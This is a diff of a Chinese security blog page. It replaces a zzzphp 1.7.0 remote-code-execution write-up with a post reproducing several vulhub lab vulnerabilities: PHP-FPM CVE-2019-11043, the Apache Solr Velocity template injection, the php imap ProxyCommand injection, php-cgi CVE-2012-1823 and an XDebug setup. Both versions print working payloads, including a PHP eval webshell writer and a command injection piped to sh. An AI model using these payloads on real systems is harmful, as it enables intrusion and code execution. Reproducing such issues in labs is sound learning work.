@@ -7,32 +7,34 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://glotozz.github.io">
-  <title>zzzphp1.7.0远程代码执行 | 往者不可谏，来者犹可追 | glotozz&#39;blog</title>
+  <title>复现几个漏洞 | 往者不可谏，来者犹可追 | glotozz&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="referrer" content="no-referrer">
   <!--more-->
-  <meta name="description" content="昨天被一道入群题搞自闭了。。。加上今天8节课拉满，无聊的时候翻翻力哥的blog是我唯一的快乐😀，看到有一篇比较好理解的”zzzphp1.7.0远程代码执行”，自己也来复现记录一下">
-<meta name="keywords" content="漏洞复现,zzzphp">
+  <meta name="keywords" content="漏洞复现,cve">
 <meta property="og:type" content="article">
-<meta property="og:title" content="zzzphp1.7.0远程代码执行">
-<meta property="og:url" content="https://glotozz.github.io/2019/09/19/zzzphp1-7-0远程代码执行/index.html">
+<meta property="og:title" content="复现几个漏洞">
+<meta property="og:url" content="https://glotozz.github.io/2019/11/16/复现几个近期漏洞/index.html">
 <meta property="og:site_name" content="往者不可谏，来者犹可追 | glotozz&#39;blog">
-<meta property="og:description" content="昨天被一道入群题搞自闭了。。。加上今天8节课拉满，无聊的时候翻翻力哥的blog是我唯一的快乐😀，看到有一篇比较好理解的”zzzphp1.7.0远程代码执行”，自己也来复现记录一下">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://i.loli.net/2019/09/19/ZL14G6NvJbxDflQ.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/19/eQ2zYlPvcaj6GH5.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/19/GYe5xHMRvZuDhOo.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/19/Px2gUaR38LctTNf.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/19/WKg53pEDG9JFoS2.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/19/UvAYPDWuZkns61H.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/19/VSAyTLXBP4ni5cG.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/19/Kf1l9dXseHMkZWj.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/19/Ivbk6sADuWVe9YQ.png">
-<meta property="og:updated_time" content="2019-11-15T12:55:44.202Z">
+<meta property="og:image" content="https://i.loli.net/2019/11/16/AWNC4qfFgxQS2p9.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/16/CzflPosqyhLK7Ae.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/16/sqfwKpj5YOZoA2P.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/16/3ZczfQ8VlqEm9uL.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/16/IDOZvStPpj4hbYG.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/16/ZuxjQEKroH1edm7.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/16/VokfDib6jE3SQ2l.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/16/I3X4qOKelcRMPyQ.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/16/awuRtvHldrWUiBL.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/16/rhRxbdDUn2H4ZKf.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/16/NAZMaP4IohgYeyi.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/16/RTZlUrgWSjcEevq.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/16/rz58GNo6bRdgI2c.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/16/KJmEzgBOacZ1xMH.png">
+<meta property="og:updated_time" content="2019-11-16T15:08:24.228Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="zzzphp1.7.0远程代码执行">
-<meta name="twitter:description" content="昨天被一道入群题搞自闭了。。。加上今天8节课拉满，无聊的时候翻翻力哥的blog是我唯一的快乐😀，看到有一篇比较好理解的”zzzphp1.7.0远程代码执行”，自己也来复现记录一下">
-<meta name="twitter:image" content="https://i.loli.net/2019/09/19/ZL14G6NvJbxDflQ.png">
+<meta name="twitter:title" content="复现几个漏洞">
+<meta name="twitter:image" content="https://i.loli.net/2019/11/16/AWNC4qfFgxQS2p9.png">
   
   
     <link rel="icon" href="https://raw.githubusercontent.com/glotozz/images/master/bitbug_favicon.ico">
@@ -164,20 +166,20 @@
           </div>
           <div id="js-content" class="content-ll">
             
-<article id="post-zzzphp1-7-0远程代码执行" class="article article-type-post " itemscope itemprop="blogPost">
+<article id="post-复现几个近期漏洞" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      zzzphp1.7.0远程代码执行
+      复现几个漏洞
     </h1>
   
 
         
-        <a href="/2019/09/19/zzzphp1-7-0远程代码执行/" class="archive-article-date">
-  	<time datetime="2019-09-19T09:45:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-19</time>
+        <a href="/2019/11/16/复现几个近期漏洞/" class="archive-article-date">
+  	<time datetime="2019-11-16T04:36:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-16</time>
 </a>
         
       </header>
@@ -185,59 +187,175 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<p>昨天被一道入群题搞自闭了。。。加上今天8节课拉满，无聊的时候翻翻力哥的blog是我唯一的快乐😀，看到有一篇比较好理解的”zzzphp1.7.0远程代码执行”，自己也来复现记录一下</p>
-</blockquote>
-<meta name="referrer" content="no-referrer">
-
+        <meta name="referrer" content="no-referrer">
 <a id="more"></a>
 
-<h4 id="一、获取漏洞"><a href="#一、获取漏洞" class="headerlink" title="一、获取漏洞"></a>一、获取漏洞</h4><p>zzzphp1.7.0远程代码执行</p>
-<h4 id="二、漏洞实现"><a href="#二、漏洞实现" class="headerlink" title="二、漏洞实现"></a>二、漏洞实现</h4><p>管理员后台-模板管理-<code>html</code>-<code>search.php</code></p>
-<p>修改（增加）如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:1)file_put_contents(str_replace(&apos;*&apos;,&apos;&apos;,&apos;glotozz.pphphp&apos;),str_replace(&apos;*&apos;,&apos;&apos;,&apos;&lt;?pphphp evevalal(ggetet_defined_vars()[_PPOSTOST][1]);&apos;));//&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2019/09/19/ZL14G6NvJbxDflQ.png" alt="Snipaste_2019-09-19_18-12-49.png"></p>
-<p>访问生成我们的恶意文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/zzzctf/search/</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2019/09/19/eQ2zYlPvcaj6GH5.png" alt="Snipaste_2019-09-19_18-15-04.png"></p>
-<h4 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h4><blockquote>
-<p>漏洞成因最主要还是使用<code>str_ireplace()</code>函数来过滤用户输入，导致可以双写绕过</p>
+<p><strong>划划水，明天开始代码审计😝</strong></p>
+<h3 id="1、php-远程代码执行漏洞-CVE-2019-11043"><a href="#1、php-远程代码执行漏洞-CVE-2019-11043" class="headerlink" title="1、php 远程代码执行漏洞(CVE-2019-11043)"></a>1、php 远程代码执行漏洞(CVE-2019-11043)</h3><blockquote>
+<p>链接： <a href="https://bugs.php.net/bug.php?id=78599" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78599</a> </p>
+<p> <strong>env_path_info underflow in fpm_main.c can lead to RCE</strong> </p>
 </blockquote>
-<p><code>index.php</code>引入<code>&#39;inc/zzz_client.php&#39;;</code></p>
-<p>在<code>zzz_client.php</code>中引入模板并使用<code>getlocation()</code></p>
-<p><img src="https://i.loli.net/2019/09/19/GYe5xHMRvZuDhOo.png" alt="Snipaste_2019-09-19_18-34-36.png"></p>
-<p><code>switch</code>匹配<code>search</code>模板</p>
-<p><img src="https://i.loli.net/2019/09/19/Px2gUaR38LctTNf.png" alt="Snipaste_2019-09-19_18-36-23.png"></p>
-<p>实例化模板，调用<code>parseCommon()</code></p>
-<p><img src="https://i.loli.net/2019/09/19/WKg53pEDG9JFoS2.png" alt="Snipaste_2019-09-19_18-36-43.png"></p>
-<p>查看<code>parseCommon()</code>函数，存在<code>parserIfLabel()</code></p>
-<p><img src="https://i.loli.net/2019/09/19/UvAYPDWuZkns61H.png" alt="Snipaste_2019-09-19_18-38-10.png"></p>
-<p>正则匹配<code>{if:xxx}xxx{end if}</code>，用户传入的数据用<code>danger_key()</code>过滤</p>
-<p><img src="https://i.loli.net/2019/09/19/VSAyTLXBP4ni5cG.png" alt="Snipaste_2019-09-19_18-42-30.png"></p>
-<p>跟踪<code>danger_key()</code>，使用<code>str_ireplace()</code>将用户关键词替换为<code>*</code>，之后直接进入<code>eval()</code>函数</p>
-<p><img src="https://i.loli.net/2019/09/19/Kf1l9dXseHMkZWj.png" alt="Snipaste_2019-09-19_18-56-51.png"></p>
+<h4 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h4><blockquote>
+<p>当<code>Nginx</code>使用特定的<code>fastcgi配置</code>时，存在远程代码执行漏洞，但这个配置并非<code>Nginx</code>默认配置。<br>当<code>fastcgi_split_path_info</code>字段被配置为 <code>^(.+?\.php)(/.*)$;</code>时，攻击者可以通过精心构造的payload，造成远程代码执行漏洞，该配置已被广泛使用，危害较大 </p>
+</blockquote>
+<p> 当<code>Nginx + php-fpm</code>的服务器有如下配置的时候，都会出现 RCE</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^/]\.php(/|$) &#123;</span><br><span class="line">  ...</span><br><span class="line">  fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line">  fastcgi_param PATH_INFO       $fastcgi_path_info;</span><br><span class="line">  fastcgi_pass   php:9000;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h4><blockquote>
+<p>环境：</p>
+<p><a href="https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043</a> </p>
+</blockquote>
+<p>之前一直是用<code>docker</code>，这里需要用<code>docker-compose</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#安装</span><br><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/1.22.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>
+
+<p>拉取并搭建</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@glotozz CVE-2019-11043]# docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>能访问<code>http://ip:8080/index.php</code>即可</p>
 <blockquote>
-<p>因此，我们考虑用<code>str_replace()</code>将<code>*</code>替换为空，<code>$</code>被替换我们可以使用<code>get_defined_vars()</code>来获取参数，之前<code>codebreaking-4</code>中也有涉及，<code>apache</code>中可以使用<code>getallheaders()</code>,<code>nginx</code>使用<code>get_defined_vars()</code></p>
+<p>工具：</p>
+<p> <a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">https://github.com/neex/phuip-fpizdam</a> </p>
 </blockquote>
-<p>构造payload（参考链接里面的师傅）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:1)file_put_contents(str_replace(&apos;*&apos;,&apos;&apos;,&apos;glotozz.pphphp&apos;),str_replace(&apos;*&apos;,&apos;&apos;,&apos;&lt;?pphphp evevalal(ggetet_defined_vars()[_PPOSTOST][1]);&apos;));//&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure>
+<p>需要安装<code>go语言</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://dl.google.com/go/go1.12.linux-amd64.tar.gz</span><br><span class="line">sudo tar -zxvf go1.12.linux-amd64.tar.gz -C /usr/local</span><br><span class="line">export PATH=$PATH:/usr/local/go/bin</span><br></pre></td></tr></table></figure>
 
-<p>具体执行代码</p>
-<p>1、//闭合后面的括号)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a = &apos;1)phpinfo();//&apos;;</span><br><span class="line">	eval(&apos;if(1&apos;.$a.&apos;)&apos;);</span><br></pre></td></tr></table></figure>
+<p>进入POC目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go build</span><br><span class="line">go run . &quot;http://59.110.164.44:8080/index.php&quot;</span><br></pre></td></tr></table></figure>
 
-<p>2、<img src="https://i.loli.net/2019/09/19/Ivbk6sADuWVe9YQ.png" alt="Snipaste_2019-09-19_21-21-48.png"></p>
-<p>3、</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1)file_put_contents(str_replace(&apos;*&apos;,&apos;&apos;,&apos;glotozz.p*hp&apos;),str_replace(&apos;*&apos;,&apos;&apos;,&apos;&lt;?p*hp ev*al(g*et_defined_vars()[_P*OST][1]);&apos;));//</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line">@eval(&apos;if(1)file_put_contents(str_replace(&apos;*&apos;,&apos;&apos;,&apos;glotozz.p*hp&apos;),str_replace(&apos;*&apos;,&apos;&apos;,&apos;&lt;?p*hp ev*al(g*et_defined_vars()[_P*OST][1]);&apos;));//&apos;)</span><br></pre></td></tr></table></figure>
-
-<h4 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h4><p>不使用<code>str_replace()</code>替换关键字，使用<code>preg_replace()</code>直接过滤关键字</p>
+<p><img src="https://i.loli.net/2019/11/16/AWNC4qfFgxQS2p9.png" alt="Snipaste_2019-11-16_16-39-42.png"></p>
+<p><img src="https://i.loli.net/2019/11/16/CzflPosqyhLK7Ae.png" alt="Snipaste_2019-11-16_16-38-25.png"></p>
 <blockquote>
-<p>第一次写漏洞复现，参考链接里的师傅和力哥写的，这次省赛回来之后就安心代码审计把，我的ctf刚入门就入土了。😂</p>
+<p>注意，因为php-fpm会启动多个子进程，在访问/index.php?a=id时需要多访问几次，以访问到被污染的进程。 </p>
 </blockquote>
-<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://xz.aliyun.com/t/6068#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/6068#toc-5</a></p>
-<p><a href="https://zhzhdoai.github.io/2019/08/25/zzzphp1-7-0远程代码执行/" target="_blank" rel="noopener">https://zhzhdoai.github.io/2019/08/25/zzzphp1-7-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a></p>
+<h3 id="2、Apache-solr模板注入漏洞"><a href="#2、Apache-solr模板注入漏洞" class="headerlink" title="2、Apache solr模板注入漏洞"></a>2、Apache solr模板注入漏洞</h3><blockquote>
+<p>2019年10月31日，国外安全研究员s00py在Github公开了一个Apache Solr Velocity模板注入远程命令执行的poc。</p>
+<p>经过研究，发现该0day漏洞真实有效并且可以攻击最新版本(8.2.0)的Solr。</p>
+</blockquote>
+<blockquote>
+<p>环境：</p>
+<p> <a href="https://www.apache.org/dyn/closer.lua/lucene/solr/8.2.0/solr-8.2.0.zip" target="_blank" rel="noopener">https://www.apache.org/dyn/closer.lua/lucene/solr/8.2.0/solr-8.2.0.zip</a></p>
+</blockquote>
+<p>搭建</p>
+<p><img src="https://i.loli.net/2019/11/16/sqfwKpj5YOZoA2P.png" alt="Snipaste_2019-11-16_16-57-03.png"></p>
+<p>需要创建一个<code>core</code>， 先手动在<code>/server/solr/</code>目录下创建一个<code>test</code>的文件夹，然后将<code>/server/solr/configsets/_default/</code>下的<code>conf目录</code>拷贝到<code>test目录</code>下 ，</p>
+<p>再在页面创建</p>
+<p><img src="https://i.loli.net/2019/11/16/3ZczfQ8VlqEm9uL.png" alt="Snipaste_2019-11-16_17-18-03.png"></p>
+<p>访问<code>http://127.0.0.1:8983/solr/test/config</code></p>
+<p><img src="https://i.loli.net/2019/11/16/IDOZvStPpj4hbYG.png" alt="Snipaste_2019-11-16_17-20-50.png"></p>
+<blockquote>
+<p><code>Apache Solr</code>默认集成<code>VelocityResponseWriter</code>插件，该插件初始化参数中的<code>params.resource.loader.enabled</code>默认值设置为<code>false</code>，但是可以通过<code>POST</code>请求直接修改集合设置，将其设置为<code>true</code>，然后就可以构造特殊的<code>GET请求</code>来实现远<code>程代码执行</code>。 </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/16/ZuxjQEKroH1edm7.png" alt="Snipaste_2019-11-16_17-31-30.png"></p>
+<p>再次观察已被置为<code>true</code></p>
+<p><img src="https://i.loli.net/2019/11/16/VokfDib6jE3SQ2l.png" alt="Snipaste_2019-11-16_17-32-14.png"></p>
+<p><code>实现RCE</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/16/I3X4qOKelcRMPyQ.png" alt="Snipaste_2019-11-16_17-34-13.png"></p>
+<p><strong>前两个是Seebug漏洞库看到的比较新的漏洞，后面的是复现第一个漏洞时发现了vulhub，放在一起还有几个早一点的漏洞，顺便学习复现下</strong></p>
+<h3 id="3、PHP-imap-远程命令执行漏洞（CVE-2018-19518）"><a href="#3、PHP-imap-远程命令执行漏洞（CVE-2018-19518）" class="headerlink" title="3、PHP imap 远程命令执行漏洞（CVE-2018-19518）"></a>3、PHP imap 远程命令执行漏洞（CVE-2018-19518）</h3><blockquote>
+<p><code>php imap</code>扩展用于在PHP中执行邮件收发操作。其<code>imap_open</code>函数会调用rsh来连接远程shell，而<code>debian/ubuntu</code>中默认使用<code>ssh</code>来代替<code>rsh</code>的功能（也就是说，在<code>debian</code>系列系统中，执行<code>rsh</code>命令实际执行的是<code>ssh</code>命令）。</p>
+<p>因为<code>ssh</code>命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p>
+</blockquote>
+<h4 id="搭建环境-1"><a href="#搭建环境-1" class="headerlink" title="搭建环境"></a>搭建环境</h4><blockquote>
+<p>环境：</p>
+<p> <a href="https://github.com/vulhub/vulhub/tree/master/php/CVE-2018-19518" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/CVE-2018-19518</a> </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname=x -oProxyCommand=echo	ZWNobyAnMTIzNDU2Nzg5MCc+L3RtcC90ZXN0MDAwMQo=|base64	-d|sh&#125;&amp;username=111&amp;password=222</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/16/awuRtvHldrWUiBL.png" alt="Snipaste_2019-11-16_18-43-09.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose exec web bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/16/rhRxbdDUn2H4ZKf.png" alt="Snipaste_2019-11-16_18-43-37.png"></p>
+<h3 id="4、PHP-CGI远程代码执行漏洞（CVE-2012-1823）"><a href="#4、PHP-CGI远程代码执行漏洞（CVE-2012-1823）" class="headerlink" title="4、PHP-CGI远程代码执行漏洞（CVE-2012-1823）"></a>4、PHP-CGI远程代码执行漏洞（CVE-2012-1823）</h3><blockquote>
+<p>影响版本 php &lt; 5.3.12 or php &lt; 5.4.2 </p>
+</blockquote>
+<blockquote>
+<p>访问<code>http://your-ip:8080/index.php?-s</code>即爆出源码，说明漏洞存在。 </p>
+<p>那么，可控命令行参数，能做些什么事。</p>
+<p>通过阅读源码，我发现cgi模式下有如下一些参数可用：</p>
+<ul>
+<li><code>-c</code> 指定php.ini文件的位置</li>
+<li><code>-n</code> 不要加载php.ini文件</li>
+<li><code>-d</code> 指定配置项</li>
+<li><code>-b</code> 启动fastcgi进程</li>
+<li><code>-s</code> 显示文件源码</li>
+<li><code>-T</code> 执行指定次该文件</li>
+<li><code>-h</code>和<code>-?</code> 显示帮助</li>
+</ul>
+<p>最简单的利用方式，当然就是<code>-s</code>，可以直接显示源码：</p>
+</blockquote>
+<p><strong>突然想起之前有些题目是通过这个来读取源码的，漏洞原理具体参考链接，还是比较好理解的</strong></p>
+<blockquote>
+<p>这个漏洞简单来说，就是用户请求的querystring被作为了php-cgi的参数，最终导致了一系列结果。</p>
+</blockquote>
+<h4 id="搭建环境-2"><a href="#搭建环境-2" class="headerlink" title="搭建环境"></a>搭建环境</h4><blockquote>
+<p>环境：</p>
+<p><a href="https://github.com/vulhub/vulhub/tree/master/php/CVE-2012-1823" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/CVE-2012-1823</a> </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://59.110.164.44:8080/?-s</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/16/NAZMaP4IohgYeyi.png" alt="Snipaste_2019-11-16_19-15-47.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/index.php?-d allow_url_include=on -d auto_prepend_file=php://input</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">&lt;?php echo shell_exec(&quot;id&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/16/RTZlUrgWSjcEevq.png" alt="Snipaste_2019-11-16_19-19-21.png"></p>
+<h3 id="5、PHP文件包含漏洞（利用phpinfo）"><a href="#5、PHP文件包含漏洞（利用phpinfo）" class="headerlink" title="5、PHP文件包含漏洞（利用phpinfo）"></a>5、PHP文件包含漏洞（利用phpinfo）</h3><blockquote>
+<p>PHP文件包含漏洞中，如果找不到可以包含的文件，我们可以通过包含临时文件的方法来getshell。因为临时文件名是随机的，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。 </p>
+</blockquote>
+<h4 id="利用原理（参考链接写真好👍）"><a href="#利用原理（参考链接写真好👍）" class="headerlink" title="利用原理（参考链接写真好👍）"></a>利用原理（参考链接写真好👍）</h4><blockquote>
+<p>在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是<code>/tmp/php[6个随机字符]</code>），文件名可以在<code>$_FILES</code>变量中找到。这个临时文件，在请求结束后就会被删除。</p>
+<p>同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到<code>$_FILES</code>变量的内容，自然也包含临时文件名。</p>
+<p>在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。</p>
+<p>但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。</p>
+</blockquote>
+<blockquote>
+<p>这个时候就需要用到条件竞争，具体流程如下：</p>
+<ol>
+<li>发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据</li>
+<li>因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大</li>
+<li>php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接</li>
+<li>所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</li>
+<li>此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</li>
+<li>利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell</li>
+</ol>
+</blockquote>
+<h4 id="搭建环境-3"><a href="#搭建环境-3" class="headerlink" title="搭建环境"></a>搭建环境</h4><blockquote>
+<p>环境：</p>
+<p> <a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a> </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><blockquote>
+<p>利用脚本<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py" target="_blank" rel="noopener">exp.py</a>实现了上述过程，成功包含临时文件后，会执行<code>&#39;)?&gt;</code>，写入一个新的文件<code>/tmp/g</code>，这个文件就会永久留在目标机器上。</p>
+</blockquote>
+<p>用python2执行：<code>python exp.py your-ip 8080 100</code>：</p>
+<p>失败了。。</p>
+<p><img src="https://i.loli.net/2019/11/16/rz58GNo6bRdgI2c.png" alt="Snipaste_2019-11-16_21-34-57.png"></p>
+<h3 id="6、XDebug-远程调试漏洞（代码执行）"><a href="#6、XDebug-远程调试漏洞（代码执行）" class="headerlink" title="6、XDebug 远程调试漏洞（代码执行）"></a>6、XDebug 远程调试漏洞（代码执行）</h3><blockquote>
+<p><code>XDebug</code>是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置<code>remote_connect_back = 1</code>：</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_connect_back = 1</span><br><span class="line">xdebug.remote_enable = 1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这个配置下，我们访问<code>http://target/index.php?XDEBUG_SESSION_START=phpstorm</code>，目标服务器的<code>XDebug</code>将会连接访问者的IP（或<code>X-Forwarded-For</code>头指定的地址）并通过<code>dbgp协议</code>与其通信，我们通过<code>dbgp</code>中提供的<code>eval方法</code>即可在目标服务器上<code>执行任意PHP代码</code>。</p>
+</blockquote>
+<h4 id="搭建环境-4"><a href="#搭建环境-4" class="headerlink" title="搭建环境"></a>搭建环境</h4><blockquote>
+<p>环境：</p>
